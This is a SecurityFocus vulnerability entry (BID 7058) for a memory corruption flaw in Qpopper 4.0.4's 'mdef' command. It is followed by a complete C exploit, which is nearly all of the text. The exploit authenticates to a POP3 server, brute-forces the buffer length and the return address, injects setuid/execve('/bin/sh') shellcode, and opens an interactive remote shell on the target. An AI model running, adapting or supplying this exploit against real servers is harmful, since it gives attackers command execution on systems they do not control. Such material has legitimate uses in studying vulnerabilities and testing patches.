source: http://www.securityfocus.com/bid/7058/info

A memory corruption vulnerability has been discovered in Qpopper version 4.0.4 and earlier. 

The vulnerability occurs when calling the 'mdef' command and a malicious macro name is supplied. By filling a target buffer with a malicious macro name it may be possible to trigger a procedure that would cause sensitive memory to be corrupted. The problem occurs due to the lack of NULL termination by the Qvsnprintf() function.

Successful exploitation of this issue may allow a remote attacker to execute arbitrary commands with the privileges of the Qpopper service.

#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

char shellcode[] =
        "\x31\xc0"              /* xor %eax, %eax       */
        "\x31\xdb"              /* xor %ebx, %ebx       */
        "\xb0\x17"              /* mov $0x17, %al       */
        "\xcd\x80"              /* int  $0x80           */
        "\x31\xc0"              /* xor %eax, %eax       */
        "\x50"                  /* push %eax            */
        "\x68\x2f\x2f\x73\x68"  /* push $0x68732f2f     */
        "\x68\x2f\x62\x69\x6e"  /* push $0x6e69622f     */
        "\x89\xe3"              /* mov  %esp,%ebx       */
        "\x50"                  /* push %eax            */
        "\x53"                  /* push %ebx            */
        "\x89\xe1"              /* mov  %esp,%ecx       */
        "\x31\xd2"              /* xor  %edx,%edx       */
        "\xb0\x08"              /* mov  $0x8,%al        */
        "\x40\x40\x40"          /* inc  %eax  (3 times) */
        "\xcd\x80";             /* int  $0x80           */

#define BUFLEN 1006
#define RETLEN 148
#define RETADDR 0xbfffc004

void
shell_io (fd)
  int fd;
{
   fd_set fs;
   char buf[1000];
   int len;
   
   while (1) 
     {
	FD_ZERO(&fs);
	FD_SET(0, &fs);
	FD_SET(fd, &fs);
	select(fd+1, &fs, NULL, NULL, NULL);
	if (FD_ISSET(0, &fs))
	  {
	     if ((len = read(0, buf, 1000)) <= 0)
	       break;
	     write(fd, buf, len);
	  }
	else
	  {
	     if ((len = read(fd, buf, 1000)) <= 0)
	       break;
	     write(1, buf, len);
	  }
     }
}

   

void
send_mdef (fd, buflen, retaddr, rashift)
  int fd, buflen, rashift;
  unsigned int retaddr;
{
   char buf[2000], *bp;
   int i;

   memset(buf, 0x90, 2000);
   memcpy(buf, "mdef ", 5);
   memcpy(buf + buflen - RETLEN - strlen(shellcode),
	  shellcode, strlen(shellcode));
   bp = (char *) (((unsigned int)(buf + buflen - RETLEN)) & 0xfffffffc);
   for (i = 0; i < RETLEN; i += 4)
     memcpy(bp+i+rashift, &retaddr, sizeof(int));
   buf[buflen-2] = '(';
   buf[buflen-1] = ')';
   buf[buflen] = '\n';
   write(fd, buf, buflen+1);
   return;
}

int get_pop_reply (int fd, char *buf, int buflen)
{
   int len;
   fd_set s;
   struct timeval tv;
   
   len = read (fd, buf, buflen);
   FD_ZERO(&s);
   FD_SET(fd, &s);
   tv.tv_sec = tv.tv_usec = 0;
   select(fd+1, &s, NULL, NULL, &tv);
   if (FD_ISSET(fd, &s))
     len = read (fd, buf, buflen);
   
   if (len == 0)
     return 0;
   else if (!strncmp(buf, "-ERR ", 5))
     return -1;
   else
     return len;
}

int
open_pop(ip, user, pass)
  unsigned int ip;
  char *user, *pass;
{
   struct sockaddr_in peer;
   int fd, st = 0;
   char buf[1024];
   int state = 0;

   peer.sin_family = AF_INET;
   peer.sin_port = htons(110);
   peer.sin_addr.s_addr = ip;
   
   fd = socket(AF_INET, SOCK_STREAM, 0);
   if (fd < 0)
     {
	perror("socket");
	exit(EXIT_FAILURE);
     }
   printf("Connecting to %s... ", inet_ntoa(peer.sin_addr));
   fflush(stdout);
   if (connect(fd, (struct sockaddr *)&peer, sizeof(struct sockaddr_in)) < 0) 
     {
	perror("connect");
	exit(EXIT_FAILURE);
     }
   printf("Logging in... ");
   fflush(stdout);
   while ((state < 3) && ((st = read(fd, buf, 1024)) > 0))
     {
	if (!strncmp(buf, "+OK ", 4)) 
	  {
	     switch (state)
	       {
		case 0:
		  snprintf(buf, 1024, "USER %s\n", user);
		  write(fd, buf, strlen(buf));
		  state++;
		  break;
		case 1:
		  snprintf(buf, 1024, "PASS %s\n", pass);
		  write(fd, buf, strlen(buf));
		  state++;
		  break;
		case 2:
		  state++;
		  break;
	       }
	  }
	else if (!strncmp(buf, "-ERR ", 5))
	  {
	     fprintf(stderr, "Could not log in. Did you provide a valid "
		     "username/password-combination?\n");
	     break;
	  }
	else
	  {
	     fprintf(stderr, "Invalid response from POP-Server:\n'%s'\n",
		     buf);
	     break;
	  }
     }
   if (state < 3) 
     {
	fprintf(stderr, "Exiting due to error...\n");
	exit(EXIT_FAILURE);
     }
   else if (st < 0)
     {
	perror("read");
	exit(EXIT_FAILURE);
     }
   else if (st == 0)
     {
	fprintf(stderr, "Peer closed...\n");
	exit(EXIT_FAILURE);
     }
   return fd;
}

int
main (argc, argv)
  int argc;
  char *argv[];
{
   char *host, *user, *pass;
   struct hostent *he;
   struct in_addr in;
   unsigned int ip, retaddr;
   int fd = -1, lbs, bs, ubs, found = 0, st;
   char buf[2000];
   
   if (4 != argc) 
     {
	fprintf(stderr, "Usage: %s <host> <user> <pass>\n\n", argv[0]);
	exit(EXIT_FAILURE);
     }
   
   host = argv[1];
   user = argv[2];
   pass = argv[3];
   if (!inet_aton(host, &in))
     {
	if (!(he = gethostbyname(host))) 
	  {
	     herror("Resolving host");
	     exit(EXIT_FAILURE);
	  }
	in.s_addr = *((unsigned int *)he->h_addr);
     }
   ip = in.s_addr;
   
   printf("Phase 1: Seeking buffer size\n");
   lbs = 0;
   bs = BUFLEN;
   ubs = 2000;
   while (!found && (bs != lbs) && (bs != ubs))
     {
	if (fd < 0)
	  fd = open_pop(ip, user, pass);
	printf("Trying %d bytes... ", bs);
	fflush(stdout);
	send_mdef(fd, bs, 0x01010101, 0);
	sleep(1);
	switch ((st = get_pop_reply(fd, buf, 2000)))
	  {
	   case 0:
	     found++;
	     close(fd);
	     fd = -1;
	     break;
	   case -1:
	     printf("too long.\n");
	     ubs = bs;
	     bs = (lbs+ubs)/2;
	     break;
	   default:
	     if (st < bs) 
	       {
		  printf("(slightly) too long.\n");
		  ubs = bs;
		  bs = (lbs+ubs)/2;
		  break;
	       }
	     else
	       {
		  printf("too short.\n");
		  lbs = bs;
		  bs = (lbs+ubs)/2;
		  break;
	       }
	  }
     }
   if (!found) 
     {
	printf("Couldn't find correct buffersize...\n");
	exit(EXIT_FAILURE);
     }
   printf("crash.\n");
   while (found) 
     {
	bs--;
	if (fd < 0)
	  fd = open_pop(ip, user, pass);
	printf("Trying %d bytes... ", bs);
	fflush(stdout);
	send_mdef(fd, bs, 0x01010101, 0);
	sleep(1);
	if (get_pop_reply(fd, buf, 2000))
	  {
	     printf("no crash\n");
	     bs += 4;
	     bs = bs & 0xfffffffc;
	     found = 0;
	  }
	else 
	  {
	     fd = -1;
	     printf("crash\n");
	  }
     }	     
   printf("Optimal buffer size: %d\n\n", bs);
   
   
   printf("Phase 2: Find return address\n");
   found = 0;
   retaddr = RETADDR;
   while (!found) 
     {
	if (fd < 0)
	  fd = open_pop(ip, user, pass);
	printf("Trying %x... ", retaddr);
	fflush(stdout);
	send_mdef(fd, bs, retaddr, 2);
	sleep(1);
	if (get_pop_reply(fd, buf, 2000))
	  {
	     printf("no crash\n");
	     found = 1;
	  }
	else
	  {
	     fd = -1;
	     retaddr += ((bs - RETLEN - 10 - strlen(shellcode)) & 0xffffff00);
	     printf("crash\n");
	  }
	if (retaddr > 0xbfffff00)
	  break;
     }
   if (!found) 
     {
	printf("Couldn't find a valid return address\n");
	exit(EXIT_FAILURE);
     }
   write(fd, "uname -a\n", 9);
   st = read(fd, buf, 100);
   buf[st] = '\0';
   if ((buf[0] != '-') && (buf[0] != '+'))
     {
	printf("We're in! (%s)\n", buf);
	shell_io(fd);
     }
   else
     printf("We failed...\n");
   
   exit(EXIT_FAILURE);
}